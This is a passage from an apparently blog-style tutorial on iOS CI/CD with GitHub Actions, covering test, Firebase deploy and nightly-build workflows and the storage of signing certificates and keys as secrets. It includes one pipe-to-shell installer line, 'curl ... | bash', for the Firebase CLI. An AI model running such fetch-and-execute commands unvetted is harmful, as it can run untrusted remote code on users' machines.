device:\"${RUNNER_NAME} (${SIMULATOR_IOS_VERSION})\" # Here we are using GitHub Hosted Runner, so there is no such issue, and we can directly use device:\"${SIMULATOR_NAME} (${SIMULATOR_IOS_VERSION})\" # If an error occurs, do not exit immediately and write all output to temp/testing_output.txt # We will analyze the file content later to distinguish between Build Failed and Test Failed, commenting different messages to the PR set +e # EXIT_CODE stores the exit code of the execution. # 0 = OK # 1 = exit EXIT_CODE=0 # Write all output to a file bundle exec fastlane ${TEST_LANE} device:\"${SIMULATOR_NAME} (${SIMULATOR_IOS_VERSION})\" | tee \"$RUNNER_TEMP/testing_output.txt\" # If the current EXIT_CODE is 0, assign ${pipestatus[1]} to EXIT_CODE [[ $EXIT_CODE -eq 0 ]] &amp;&amp; EXIT_CODE=${pipestatus[1]} # Restore error handling set -e # Check Testing Output # If Testing Output contains \"Error building\", set is_build_error=true for Actions environment variable, indicating Build failure # If Testing Output contains \"Tests have failed\", set is_test_error=true for Actions environment variable, indicating Test failure if grep -q \"Error building\" \"$RUNNER_TEMP/testing_output.txt\"; then echo \"is_build_error=true\" &gt;&gt; $GITHUB_OUTPUT echo \"❌ Detected Build Error\" elif grep -q \"Tests have failed\" \"$RUNNER_TEMP/testing_output.txt\"; then echo \"is_test_error=true\" &gt;&gt; $GITHUB_OUTPUT echo \"❌ Detected Test Error\" fi # Restore Exit Code Output exit $EXIT_CODE # ========== Handle Result Steps ========== # Parse *.junit test reports, and mark results, Comment (if it's a PR) - name: Publish Test Report # Directly reuse a pre-written .junit Parser Actions: https://github.com/mikepenz/action-junit-report uses: mikepenz/action-junit-report@v5 # if: # Previous step (Testing) success or # Previous step (Testing) failed and is_test_error (do not execute this step if build failed) if: ${{ (failure() &amp;&amp; steps.testing.outputs.is_test_error == 'true') || success() }} with: check_name: \"Testing Report\" comment: true updateComment: false require_tests: true detailed_summary: true report_paths: \"./Product/fastlane/test_output/*.junit\" # Comment on Build Failure - name: Build Failure Comment # if: # Previous step (Testing) failed and is_build_error and has PR Number # if: ${{ failure() &amp;&amp; steps.testing.outputs.is_build_error == 'true' &amp;&amp; github.event.pull_request.number }} uses: actions/github-script@v6 env: action_url: \"${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}/attempts/${{ github.run_attempt }}\" with: script: | const action_url = process.env.action_url const pullRequest = context.payload.pull_request || {} const commitSha = pullRequest.head?.sha || context.sha const creator = pullRequest.user?.login || context.actor const commentBody = [ `# Project or Test Build Failed ❌`, `Please check if your Pull Request can compile and run tests correctly.`, ``, `🔗 **Action**: [View Workflow Run](${action_url})`, `📝 **Commit**: ${commitSha}`, `👤 **Author**: @${creator}` ].join('\\n') await github.rest.issues.createComment({ owner: context.repo.owner, repo: context.repo.repo, issue_number: context.payload.pull_request.number, body: commentBody })Technical Highlights: runs-on: It is recommended to use a self-hosted Runner, GitHub Hosted Runner macOS is very expensive. Manually read the .xcode-version file to obtain the specified XCode version and set the DEVELOPER_DIR env in steps that require specifying XCode, allowing easy switching without Sudo. Cache: Can speed up dependency installation, but note that even for self-hosted Runners, GitHub Cloud Cache is still used and subject to billing limits. Using set +e allows commands to fail without exiting immediately + outputs everything to a file + reads the file to determine if it was Build Failed or Test Failed; otherwise, the message will uniformly indicate Test Failed.It can also be extended to check for other errors, such as: Underlying Error: Unable to boot the Simulator. indicating simulator startup failure, please try again. Checkout Code can accept specified branches: since the on: schedule event can only trigger on the main (Default Branch), if we want to schedule operations on another branch, we need to specify the branch. Specifying the .cocoapods Repo path is optional; previously, there were issues with two Runners on the same self-hosted machine getting stuck during pod install due to both operating on the .cocoapods Repo, causing a git lock.(But the probability is very low.) If you have a Private Pods Repo, you need to set up SSH Agent to have permission to clone.(Please refer to the additional notes at the end.) Remember to add to Repo -&gt; Settings -&gt; Actions secrets and variables -&gt; variables:SIMULATOR_IOS_VERSION for the simulator iOS versionSIMULATOR_NAME for the simulator nameCommit the file to the Repo main branch and manually trigger it once to verify correctness:Once confirmed, continue with the setup.GitHub Workflow SettingsRepo → Settings → Rules → Rulesets.Ruleset Configuration Ruleset Name: Ruleset Name Enforcement status: Enable/Disable this rule restriction Target branches: Target Base branches; setting Default Branch means all branches intended to merge into main or develop are subject to this rule restriction. Bypass list: Specify special identities or Teams that can bypass this restriction. Branch rules: Restrict deletions: Prohibit branch deletion Require a pull request before merging: Can only merge through PR Required approvals: Limit the number of approvals needed Require status checks to pass: Restrict which checks must pass before mergingClick + Add checks, enter Testing, and select the one with the GitHub Actions logo.There is a small issue here; if Suggestions cannot find Testing, you need to return to Actions and trigger it (try opening a PR) successfully once for it to appear here. Block force pushes: Prohibit force pushesAfter saving and confirming that the Enforcement status is Active, the rules will take effect.Once everything is set up, open a PR to test it out: Checks show CI-Testing (Required), Merging is blocked, and At least X approving review is required by reviewers with write access. This indicates successful setup.If the project build fails (Build Failed), it will comment:If the project build succeeds but test cases fail (Test Failed), it will comment:If the project build and tests succeed (Test Success), it will comment:After completing the Review Approve + Check tests successfully:Demo PRYou can merge the PR. If a new commit is pushed, it will automatically rerun the checks.Complete code: CI-Testing.ymlAuto-merge:Additionally, you can enable the following in Repo Settings → General → Pull Request: Automatically delete head branches: Automatically delete branches after merging PR Allow Auto-merge: When checks pass + required approvals are met, the PR will automatically merge.The Enable auto-merge button will only appear when conditions are set and the current conditions cannot merge.CD — Package + Deploy to Firebase App DistributionProcessUse GitHub Actions form to trigger the packaging job, specifying version number and Release Notes. After packaging, it will automatically upload to Firebase App Distribution for the team to download and test.CD-Deploy.ymlRepo → Actions → New workflow → set up a workflow yourself.# Workflow(Action) namename: CD-Deploy# Title name in Actions Logrun-name: \"[CD-Deploy] ${{ github.ref }}\"# If there is a new Job in the same Concurrency Group, it will cancel the running one# For example, triggering the same branch's packaging task repeatedly will cancel the previous taskconcurrency: group: ${{ github.workflow }}-${{ github.event_name }}-${{ github.ref }} cancel-in-progress: true# Trigger eventson: # Manual form trigger workflow_dispatch: # Form Inputs fields inputs: # App version number VERSION_NUMBER: description: 'Version Number of the app (e.g., 1.0.0). Auto-detect from the Xcode project if left blank.' required: false type: string # App Build Number BUILD_NUMBER: description: 'Build number of the app (e.g., 1). Will use a timestamp if left blank.' required: false type: string # App Release Note RELEASE_NOTE: description: 'Release notes of the deployment.' required: false type: string # Other Workflows calling this Workflow to trigger # Nightly Build will call this workflow_call: inputs: # App version number VERSION_NUMBER: description: 'Version Number of the app (e.g., 1.0.0). Auto-detect from the Xcode project if left blank.' required: false type: string # App Build Number BUILD_NUMBER: description: 'Build number of the app (e.g., 1). Will use a timestamp if left blank.' required: false type: string # App Release Note RELEASE_NOTE: description: 'Release notes of the deployment.' required: false type: string BRANCH: description: 'Branch' type: string# Define global static variablesenv: APP_STORE_CONNECT_API_KEY_FILE_NAME: \"app_store_connect_api_key.json\"# Job tasks# Jobs will run concurrentlyjobs: # Job ID deploy: # Job name (optional, setting it improves readability in logs) name: Deploy - Firebase App Distribution # Runner Label - Use GitHub Hosted Runner macos-15 to execute the job # Note: Since this project is a Public Repo, it can be used infinitely for free # Note: Since this project is a Public Repo, it can be used infinitely for free # Note: Since this project is a Public Repo, it can be used infinitely for free # If it's a Private Repo, it will be charged based on usage, and macOS machines are the most expensive (10 times), possibly reaching the 2,000 minutes free limit after running 10 times # It is recommended to use a self-hosted Runner runs-on: macos-15 # Set the maximum timeout duration to prevent endless waiting in case of anomalies timeout-minutes: 30 # use zsh # Optional, just a personal preference; the default is bash defaults: run: shell: zsh {0} # Job steps # Steps will execute in order steps: # git clone the current project &amp; checkout to the executing branch - name: Checkout repository uses: actions/checkout@v3 with: # Git Large File Storage, not needed for our testing environment # default: false lfs: false # If specified, checkout the specified branch; otherwise, use the default (current branch) # Since the on: schedule event can only run on the main branch, if you want to do Nightly Build or similar tasks, you need to specify the branch # e.g. on: schedule -&gt; main branch, Nightly Build master branch ref: ${{ github.event.inputs.BRANCH || '' }} # ========== Certificates Steps ========== # It is recommended to use Fastlane - Match to manage development certificates and directly execute match installation in the Lane # Match will manage certificates using another Private Repo, but you need to set up SSH Agent to have permission to git clone the private repo # ref: https://stackoverflow.com/questions/57612428/cloning-private-github-repository-within-organisation-in-actions # # # --- Below is the method to directly download &amp; import certificates for the Runner without using Fastlane - Match --- # ref: https://docs.github.com/en/actions/how-tos/use-cases-and-examples/deploying/installing-an-apple-certificate-on-macos-runners-for-xcode-development # # GitHub Actions Secrets cannot store files, so all certificate files must first be converted to Base64 Encoded text format and stored in Secrets # In the GitHub Actions Step, read them dynamically, write them to TEMP files, and move them to the correct location for the system to read and use # For other configuration details, please refer to the article # - name: Install the Apple certificate and provisioning profile env: BUILD_CERTIFICATE_BASE64: ${{ secrets.BUILD_CERTIFICATE_BASE64 }} P12_PASSWORD: ${{ secrets.BUILD_CERTIFICATE_P12_PASSWORD }} BUILD_PROVISION_PROFILE_BASE64: ${{ secrets.BUILD_PROVISION_PROFILE_BASE64 }} # GitHub Hosted Runner is a custom string # Self-hosted Runner is the machine login password KEYCHAIN_PASSWORD: ${{ secrets.KEYCHAIN_PASSWORD }} run: | # create variables CERTIFICATE_PATH=$RUNNER_TEMP/build_certificate.p12 PP_PATH=$RUNNER_TEMP/build_pp.mobileprovision KEYCHAIN_PATH=$RUNNER_TEMP/app-signing.keychain-db # import certificate and provisioning profile from secrets echo -n \"$BUILD_CERTIFICATE_BASE64\" | base64 --decode -o $CERTIFICATE_PATH echo -n \"$BUILD_PROVISION_PROFILE_BASE64\" | base64 --decode -o $PP_PATH # create temporary keychain security create-keychain -p \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH security set-keychain-settings -lut 21600 $KEYCHAIN_PATH security unlock-keychain -p \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH # import certificate to keychain security import $CERTIFICATE_PATH -P \"$P12_PASSWORD\" -A -t cert -f pkcs12 -k $KEYCHAIN_PATH security set-key-partition-list -S apple-tool:,apple: -k \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH security list-keychain -d user -s $KEYCHAIN_PATH # apply provisioning profile mkdir -p ~/Library/MobileDevice/Provisioning\\ Profiles cp $PP_PATH ~/Library/MobileDevice/Provisioning\\ Profiles # App Store Connect API Fastlane JSON Key # Another almost essential App Store Connect API Fastlane JSON Key (.json) in the packaging environment # format: .json content format: https://docs.fastlane.tools/app-store-connect-api/ # Contains the App Store Connect API .p8 Key # Will be passed to Fastlane later for uploading to Testflight and App Store API usage # # GitHub Actions Secrets cannot store files, so all certificate files must first be converted to Base64 Encoded text format and stored in Secrets # In the GitHub Actions Step, read them dynamically, write them to TEMP files for other steps to reference # For other configuration details, please refer to the article - name: Read and Write Apple Store Connect API Key to Temp env: APP_STORE_CONNECT_API_KEY_BASE64: ${{ secrets.APP_STORE_CONNECT_API_KEY_BASE64 }} APP_STORE_CONNECT_API_KEY_PATH: \"${{ runner.temp }}/${{ env.APP_STORE_CONNECT_API_KEY_FILE_NAME }}\" run: | # import certificate and provisioning profile from secrets echo -n \"$APP_STORE_CONNECT_API_KEY_BASE64\" | base64 --decode -o $APP_STORE_CONNECT_API_KEY_PATH # ========== Env Setup Steps ========== # Read the specified XCode version for the project # In the following steps, we will manually specify the XCode_x.x.x.app we use # instead of using xcversion, as xcversion has been sunset and is unstable. - name: Read .xcode-version id: read_xcode_version run: | XCODE_VERSION=$(cat .xcode-version) echo \"XCODE_VERSION: ${XCODE_VERSION}\" echo \"xcode_version=${XCODE_VERSION}\" &gt;&gt; $GITHUB_OUTPUT # You can also specify the global XCode version here, so you don't need to specify DEVELOPER_DIR in subsequent steps # But this command requires sudoer privileges; if it's a self-hosted runner, ensure the runner environment has sudo privileges # sudo xcode-select -s \"/Applications/Xcode_${XCODE_VERSION}.app/Contents/Developer\" # Read the specified Ruby version for the project - name: Read .ruby-version id: read_ruby_version run: | RUBY_VERSION=$(cat .ruby-version) echo \"RUBY_VERSION: ${RUBY_VERSION}\" echo \"ruby_version=${RUBY_VERSION}\" &gt;&gt; $GITHUB_OUTPUT # Install or set the Runner Ruby version to the specified project version - name: Set up Ruby uses: ruby/setup-ruby@v1 with: ruby-version: \"${{ steps.read_ruby_version.outputs.ruby_version }}\" # Optional, because previously when running multiple self-hosted runners for CI/CD, the cocoapods repos are shared directories # The problem solved is: there is a very small chance of conflicts when pulling cocoapods repos during simultaneous pod installs (because the default is $HOME/.cocoapods/) # GitHub Hosted Runner does not need this setting # - name: Change Cocoapods Repos Folder # if: contains(runner.labels, 'self-hosted') # run: | # # Each Runner uses its own .cocoapods folder to prevent resource conflicts # mkdir -p \"$HOME/.cocoapods-${{ env.RUNNER_NAME }}/\" # export CP_HOME_DIR=\"$HOME/.cocoapods-${{ env.RUNNER_NAME }}\" # rm -f \"$HOME/.cocoapods-${{ env.RUNNER_NAME }}/repos/cocoapods/.git/index.lock\" # ========== Cache Setting Steps ========== # Note that even if self-hosted, Cache is currently also Cloud Cache and will count towards usage # Rules: Automatically delete if not hit for 7 days, single Cache limit is 10 GB, Cache only on successful Action # Public Repo: Free and unlimited # Private Repo: Starting from 5 GB # Self-hosted can write Cache &amp; Restore strategies using shell scripts or use other tools for assistance # Bundle Cache (Gemfile) # Corresponds to the installation path specified in Makefile under ./vendor - name: Cache Bundle uses: actions/cache@v3 with: path: | ./vendor key: ${{ runner.os }}-bundle-${{ hashFiles('Gemfile.lock') }} restore-keys: | ${{ runner.os }}-bundle- # CocoaPods Cache (Podfile) # Default is under project/Pods - name: Cache CocoaPods uses: actions/cache@v3 with: path: | ./Product/Pods key: ${{ runner.os }}-cocoapods-${{ hashFiles('Product/Podfile.lock') }} restore-keys: | ${{ runner.os }}-cocoapods- # Mint cache # Corresponds to the installation path specified in Makefile under ./mint - name: Cache Mint uses: actions/cache@v3 with: path: ./mint key: ${{ runner.os }}-mint-${{ hashFiles('Mintfile') }} restore-keys: | ${{ runner.os }}-mint- # ==================== # Project Setup &amp; Dependency Installation - name: Setup &amp; Install Dependency run: | # Execute the Setup command encapsulated in Makefile, corresponding to commands like: # brew install mint # bundle config set path 'vendor/bundle' # bundle install # mint bootstrap # ... # etc. setup commands make setup # Execute the Install command encapsulated in Makefile, corresponding to commands like: # mint run yonaskolb/XcodeGen --quiet # bundle exec pod install # ... # etc. install commands make install - name: Deploy Beta id: deploy # Specify the working directory, so subsequent commands do not need to cd ./Product/ working-directory: ./Product/ env: # Packaging input parameters VERSION_NUMBER: ${{ inputs.VERSION_NUMBER || '' }} BUILD_NUMBER: ${{ inputs.BUILD_NUMBER || '' }} RELEASE_NOTE: ${{ inputs.RELEASE_NOTE || '' }} AUTHOR: ${{ github.actor }} # Repo -&gt; Settings -&gt; Actions secrets and variables -&gt; secrets # Firebase CLI Token secret (refer to the article for obtaining) FIREBASE_CLI_TOKEN: ${{ secrets.FIREBASE_CLI_TOKEN }} # Apple Developer Program Team ID TEAM_ID: ${{ secrets.TEAM_ID }} # Specify that this Job should use the specified XCode_x.x.x version DEVELOPER_DIR: \"/Applications/Xcode_${{ steps.read_xcode_version.outputs.xcode_version }}.app/Contents/Developer\" run: | # Get the current Timestamp BUILD_TIMESTAMP=$(date +'%Y%m%d%H%M%S') # If BUILD_NUMBER is not set, use Timestamp as App Build Number BUILD_NUMBER=\"${BUILD_NUMBER:-$BUILD_TIMESTAMP}\" ID=\"${{ github.run_id }}\" COMMIT_SHA=\"${{ github.sha }}\" BRANCH_NAME=\"${{ github.ref_name }}\" AUTHOR=\"${{ env.AUTHOR }}\" # Combine Release Note RELEASE_NOTE=\"${{ env.RELEASE_NOTE }} ID: ${ID} Commit SHA: ${COMMIT_SHA} Branch: ${BRANCH_NAME} Author: ${AUTHOR} \" # Execute Fastlane packaging &amp; deployment Lane bundle exec fastlane beta release_notes:\"${RELEASE_NOTE}\" version_number:\"${VERSION_NUMBER}\" build_number:\"${BUILD_NUMBER}\" # Recommended self-hosted security settings for GitHub Actions: # ref: https://docs.github.com/en/actions/how-tos/use-cases-and-examples/deploying/installing-an-apple-certificate-on-macos-runners-for-xcode-development#required-clean-up-on-self-hosted-runners # Corresponding Step: Install the Apple certificate and provisioning profile # Purpose is to delete the downloaded key certificate from the machine # If you are using Match, you need to rewrite it to Match's Clean - name: Clean up keychain and provisioning profile if: ${{ always() &amp;&amp; contains(runner.labels, 'self-hosted') }} run: | security delete-keychain $RUNNER_TEMP/app-signing.keychain-db rm ~/Library/MobileDevice/Provisioning\\ Profiles/build_pp.mobileprovision Remember to add a TEAM_ID variable in Repo -&gt; Settings -&gt; Actions secrets and variables -&gt; secrets, with the content being the Apple Developer Team ID string.Commit files to the Repo main branch and test the packaging feature: Please note that if other branches want to use this Action, you need to merge the CD-Deploy.yml file from the main branch first.Wait for the task to complete:Demo Packaging + Deployment Successful ✅Complete code: CD-Deploy.ymlTechnical Details — Obtaining &amp; Setting Firebase CLI TokenFollow the steps in the Firebase official documentation:First, install the Firebase CLI tool:curl -sL https://firebase.tools | bashRun:firebase login:ciComplete the login and authorization:Return to the Terminal and copy the Firebase CLI Token:Go to Repo → Settings → Secrets and variables → Actions → Add a Secret: FIREBASE_CLI_TOKEN and paste the Firebase CLI Token. This Token = your login identity Please keep it safe; if the account is no longer in use, it also needs to be changed.Technical Details — Install the Apple certificate and provisioning profileSupplementary details on importing development certificates into the Runner.Since GitHub Actions Secrets cannot store files, all certificate files must first be converted to Base64 Encoded text format and stored in Secrets. The GitHub Actions Step will then dynamically read them and write them to TEMP files, moving them to the correct location for the system to read and use.Packaging Development requires two key certificates: Provision Profile ( .mobileprovision) Development Certificate ( .p12)cicd.mobileprovisiondevelopment.cerThe Certificate downloaded from Apple Developer is in .cer format, while we need it in .p12 format. You can double-click the downloaded .cer to install it in Keychain, then right-click the certificate in Keychain and select Export.File name: cicd.p12, Format: .p12P12 key password: Enter a secure custom string (the example is a bad demonstration, using 123456)Now both files: cicd.p12 and cicd.mobileprovision are ready.Convert to BASE64 format string and store in Repo Secrets:base64 -i cicd.mobileprovision | pbcopyGo to Repo → Settings → Secrets and variables → Actions → Add a Secret: BUILD_PROVISION_PROFILE_BASE64 and paste the above content.-base64 -i cicd.p12 | pbcopyGo to Repo → Settings → Secrets and variables → Actions → Add a Secret: BUILD_CERTIFICATE_BASE64 and paste the above content.-Go to Repo → Settings → Secrets and variables → Actions → Add a Secret: P12_PASSWORD with the password you set when exporting the P12 key.-Go to Repo → Settings → Secrets and variables → Actions → Add a Secret: KEYCHAIN_PASSWORD:If it is a GitHub Hosted Runner, enter any arbitrary string. If it is a Self-hosted Runner, it should be the login password of the macOS Runner user.Technical Details — App Store Connect API KeyFastlane packaging and deployment to the App Store, Testflight requires providing a .json key. Similarly, due to GitHub Actions Secrets being limited to storing strings and not files, we also need to convert the key content into a Base64 string. The GitHub Actions Step will then dynamically read it and write it to a TEMP file, providing the file path for Fastlane to reference.First, go to App Store Connect to create &amp; download the App Store Connect API Key ( .p8):-----BEGIN PRIVATE KEY-----sssaxzzvcxzzxzvzcxvvzxcvzxvczxcvz-----END PRIVATE KEY-----Create a new app_store_connect_api.json file ( content reference ):{ \"key_id\": \"Key ID written on App Store Connect\", \"issuer_id\": \"Issuer ID written on App Store Connect\", \"key\": \"-----BEGIN PRIVATE KEY----- remember to replace line breaks with\\n-----END PRIVATE KEY-----\", \"duration\": 1200, # optional (maximum 1200) \"in_house\": false # optional but may be required if using match/sigh}After saving the file, run:base64 -i app_store_connect_api.json | pbcopyPaste the string content into Repo → Settings → Secrets and variables → Actions → Add a Secret: APP_STORE_CONNECT_API_KEY_BASE64 and paste the above content.After the Read and Write Apple Store Connect API Key to Temp Step is completed, in subsequent Steps, just pass in the env APP_STORE_CONNECT_API_KEY_PATH:- name: Deploy env: APP_STORE_CONNECT_API_KEY_PATH: \"${{ runner.temp }}/${{ env.APP_STORE_CONNECT_API_KEY_FILE_NAME }}\" run: | ....Fastlane will automatically retrieve and use it.Technical Extension — Reuse Action Workflow to Separate Packaging and Deployment ActionsIn this case, we directly use Fastlane’s beta Lane to execute both packaging and deployment actions.In practical cases, we may need to deploy the same package result to different platforms (Firebase, Testflight, etc.), so a better approach is to have packaging as one Action and deployment as another Action; otherwise, it will run packaging twice, which also aligns better with CI/CD’s division of responsibilities. The following is an example introduction:CI-Build.yml:name: Buildon: push: branches: - main workflow_call: inputs: RELEASE_NOTE: description: 'Release notes of the deployment.' required: false type: stringjobs: build: runs-on: macos-latest steps: - name: Checkout Code uses: actions/checkout@v4 - name: Install Dependencies run: | make setup make install - name: Build Project run: bundle exec fastlane build - name: Upload Build Artifact uses: actions/upload-artifact@v4 with: name: build-artifact path: ./fastlane/build/CD-Deploy-Firebase.yml:name: Deploy Firebaseon: # Automatically triggered when Build Action completes workflow_run: workflows: [\"Build\"] types: - completedjobs: deploy: runs-on: ubuntu-latest # Only execute deployment if completed and successful if: ${{ github.event.workflow_run.conclusion == 'success' }} steps: - name: Checkout Code uses: actions/checkout@v4 - name: Install Dependencies run: | make setup - name: Download Build Artifact uses: actions/download-artifact@v4 with: name: build-artifact path: ./fastlane/build/ - name: Deploy to Production run: | bundle exec fastlane deploy-firebaseCD-Deploy-Testflight.yml:name: Deploy Testflighton: # Automatically triggered when Build Action completes workflow_run: workflows: [\"Build\"] types: - completedjobs: deploy: runs-on: ubuntu-latest # Only execute deployment if completed and successful if: ${{ github.event.workflow_run.conclusion == 'success' }} steps: - name: Checkout Code uses: actions/checkout@v4 - name: Install Dependencies run: | make setup - name: Download Build Artifact uses: actions/download-artifact@v4 with: name: build-artifact path: ./fastlane/build/ - name: Deploy to Production run: | bundle exec fastlane deploy-testflightYou can also use Reusing Workflow:CD-Deploy-Firebase.yml:name: Deploy Firebaseon: # Any trigger condition, here using manual form trigger as an example workflow_dispatch: inputs: RELEASE_NOTE: description: 'Release notes of the deployment.' required: false type: stringjobs: build: needs: Build uses: ./.github/workflows/CD-Build.yml secrets: inherit with: RELEASE_NOTE: ${{ inputs.RELEASE_NOTE }} deploy: runs-on: ubuntu-latest # Job defaults to concurrent execution; use needs to wait for build to complete before executing needs: [build] # Only deploy if successful if: ${{ always() &amp;&amp; needs.deploy.result == 'success' }} steps: - name: Checkout Code uses: actions/checkout@v4 - name: Install Dependencies run: | make setup - name: Download Build Artifact uses: actions/download-artifact@v4 with: name: build-artifact path: ./fastlane/build/ - name: Deploy to Production run: | bundle exec fastlane deploy-firebaseGitHub Actions — ArtifactSimilar to Cache, even for Self-hosted Runner, the Artifact feature still operates through GitHub Cloud and is subject to usage limits ( free account starts at 500MB ). To achieve similar effects with a Self-hosted Runner, you can create a shared host directory or find other tools as alternatives.Currently, I only use Artifact to store small data, such as error results from Snapshot Tests, test reports, etc.CI— Nightly Build Executing Snapshot + Unit Tests + Packaging + CD Deployment to Firebase App DistributionProcessEvery day at 3 AM, all tests (unit + snapshot tests) are automatically run against the main (develop or master) branch. If they fail, a failure notification is sent to the Slack workgroup; if successful, a version is packaged and deployed to Firebase App Distribution, with success/failure notifications sent to Slack.CI-Nightly-Build-And-Deploy.ymlRepo → Actions → New workflow → set up a workflow yourself.# Workflow(Action) namename: CI-Nightly Build And Deploy# Title name in Actions Logrun-name: \"[CI-Nightly Build And Deploy] ${{ github.ref }}\"# Trigger eventson: # Scheduled to run automatically # https://crontab.guru/ # UTC time schedule: # UTC 19:00 = 03:00 daily UTC+8 - cron: '0 19 * * *' # Manual trigger workflow_dispatch:# Job tasks# Jobs will run concurrentlyjobs: # Testing job testing: # Reuse Workflow (workflow_call) uses: ./.github/workflows/CI-Testing.yml # Pass all Secrets to CD-Testing.yml secrets: inherit with: # Execute all tests TEST_LANE: \"run_all_tests\" # Target branch: main, develop or master...etc BRANCH: \"main\" deploy-env: runs-on: ubuntu-latest outputs: DATE_STRING: ${{ steps.get_date.outputs.DATE_STRING }} steps: - name: Get Date String id: get_date run: | VERSION_DATE=$(date -u '+%Y%m%d') echo \"${VERSION_DATE}\" echo \"DATE_STRING=${VERSION_DATE}\" &gt;&gt; $GITHUB_ENV echo \"DATE_STRING=${VERSION_DATE}\" &gt;&gt; $GITHUB_OUTPUT deploy: # Job defaults to concurrent execution; use needs to wait for testing and deploy-env to complete before executing needs: [testing, deploy-env] # Only execute if tests are successful if: ${{ needs.testing.result == 'success' }} # Reuse Workflow (workflow_call) uses: ./.github/workflows/CD-Deploy.yml # Pass all Secrets to CD-Deploy.yml secrets: inherit with: VERSION_NUMBER: NightlyBuild-${{ needs.deploy-env.outputs.DATE_STRING }} RELEASE_NOTE: NightlyBuild-${{ needs.deploy-env.outputs.DATE_STRING }} # Target branch: main, develop or master...etc BRANCH: \"main\"# ----- Slack Notify ----- testing-failed-slack-notify: needs: [testing] runs-on: ubuntu-latest if: ${{ needs.testing.result == 'failure' }} steps: - name: Post text to a Slack channel uses: slackapi/slack-github-action@v2.1.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ vars.SLACK_TEAM_CHANNEL_ID }} text: \":x: Nightly Build - Testing failed\\nWorkflow: &lt;${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}|View Run&gt;\" deploy-failed-slack-notify: needs: [deploy] runs-on: ubuntu-latest if: ${{ needs.deploy.result == 'failure' }} steps: - name: Post text to a Slack channel uses: slackapi/slack-github-action@v2.1.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ vars.SLACK_TEAM_CHANNEL_ID }} text: \":x: Nightly Build Deploy failed\\nWorkflow: &lt;${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}|View Run&gt;\" deploy-success-slack-notify: needs: [deploy] runs-on: ubuntu-latest if: ${{ needs.deploy.result == 'success' }} steps: - name: Post text to a Slack channel uses: slackapi/slack-github-action@v2.1.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ vars.SLACK_TEAM_CHANNEL_ID }} text: \":white_check_mark: Nightly Build Deploy successful\\nWorkflow: &lt;${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}|View Run&gt;\"Commit files to the Repo main branch and manually trigger the test and packaging feature to see the results: It will be automatically triggered daily in the future.DemoAfter waiting for the test tasks, packaging and deployment tasks, and notification tasks to complete, check the results.We can directly install the Nightly Build version on our mobile phones for an early experience test.Technical DetailsThis Action reuses the previously designed CI-Testing and CD-Deploy to create our Nightly Build, which is very flexible and easy to use!Complete Code: CI-Nightly-Build-And-Deploy.ymlSelf-hosted Runner ConsiderationsThis article uses a Public Repo, so we directly use GitHub Hosted macOS Runner. However, in actual work, our Repo will definitely be Private, and using GitHub Hosted Runner is very expensive (you could buy a Mac Mini for the price of a month’s usage and run it comfortably in the office), and each machine can run multiple Runners concurrently based on performance. For details, refer to the previous article “ Building and Switching to Self-hosted Runner “ section After installing XCode and the basic environment on your local computer, register and enable the Runner, and change runs-on in the Action Workflow YAML to [self-hosted].The issue of multiple Runners on the same computer has mostly been resolved in the Actions above, such as changing all shared directories to local directories. There is also a problem that may arise during testing, which is the simulator conflict issue: “When two test Jobs are run by two Runners on the same machine simultaneously, if they specify the same simulator, they will interfere with each other, causing the tests to fail.”The solution is simple: set a separate simulator for each Runner.Simulator Configuration for Multiple Runners on the Same MachineAssuming I have two Runners on the same computer receiving tasks in parallel: ZhgChgLideMacBook-Pro-Runner-A ZhgChgLideMacBook-Pro-Runner-BIn the XCode simulator settings, we need to add two simulators: Model and iOS version should match the testing environment.Change the testing steps in CI-Testing.yml to:# Run Fastlane Unit Test Lane - name: Run Tests id: testing # Specify the working directory, so subsequent commands don't need to cd ./Product/ working-directory: ./Product/ env: # ... # Repo -&gt; Settings -&gt; Actions secrets and variables -&gt; variables # iOS version of the simulator SIMULATOR_IOS_VERSION: ${{ vars.SIMULATOR_IOS_VERSION }} # Current Runner name RUNNER_NAME: ${{ runner.name }} # ... run: | # ... bundle exec fastlane ${TEST_LANE} device:\"${RUNNER_NAME} (${SIMULATOR_IOS_VERSION})\" | tee \"$RUNNER_TEMP/testing_output.txt\" # ... Change device to ${RUNNER_NAME} (${SIMULATOR_IOS_VERSION}) SIMULATOR_IOS_VERSION should still refer to the Repo variables.The combined result will be (using 18.4 as an example): Runner: ZhgChgLideMacBook-Pro-Runner-A Simulator: ZhgChgLideMacBook-Pro-Runner-A(18.4) Runner: ZhgChgLideMacBook-Pro-Runner-B Simulator: ZhgChgLideMacBook-Pro-Runner-B(18.4)This way, when both Runners are executing tests simultaneously, they will each run their own simulators.Complete Project RepoAdditional SSH Agent Configuration — For Fastlane Match or Private CocoaPods RepoWhen using Fastlane Match or Private CocoaPods Repo, since it is in another Private Repo, the current Repo/Action environment cannot directly git clone. You need to set up the SSH agent environment to have permission to operate during Action execution.Step 1. Generate SSH Keyssh-keygen -t ed25519 -C \"zhgchgli@gmail.com\"Enter file in which to save the key (/Users/zhgchgli/.ssh/id_ed25519): /Users/zhgchgli/Downloads/zhgchgli Enter the download path for easy copying of the content.Enter passphrase for “/Users/zhgchgli/Downloads/zhgchgli” (empty for no passphrase): Leave it blank: CI/CD usage cannot input Passphrase interactively in CLI, so please leave it blank. Generation complete (with .pub/private_key).Step 2. Set Deploy Key in Private Repogithub-actions-ci-cd-demo-certificates RepoSettings → Security → Deploy keys → Add deploy key. Title: Enter the key name. Key: Paste the .pub key content.Done.Step 3. Set SSH Private Key to Secrets in Action’s Repogithub-actions-ci-cd-demo RepoSettings → Secrets and variables → Actions → New repository secret. Name: Enter the secret variable name SSH_PRIVATE_KEY. Secret: Paste the private_key content.Done.Step 4. SSH Agent Configuration Complete, Verify Git Clone Private Repo PermissionsDemo-Git-Clone-Private-Repo.yml :name: Demo Git Clone Private Repoon: workflow_dispatch:jobs: clone-private-repo: name: Git Clone Private Repo runs-on: ubuntu-latest 